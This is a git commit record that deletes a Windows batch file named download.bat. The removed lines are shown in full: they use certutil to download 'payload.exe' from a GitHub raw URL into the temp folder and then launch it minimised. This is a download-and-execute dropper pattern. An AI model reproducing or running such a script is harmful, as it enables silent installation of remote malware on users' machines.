1c183120b617df2cef4a43567152fd2c1b1fe78b
serpiajonna-bit <serpiajonna@gmail.com>
2025-11-24 16:41:57 -0500

    Delete download.bat

--- download.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-setlocal
-set "url=https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
-set "outfile=%TEMP%\payload.exe"
-
-certutil -urlcache -split -f "%url%" "%outfile%"
-if exist "%outfile%" (
-    start "" /min "%outfile%"
-)
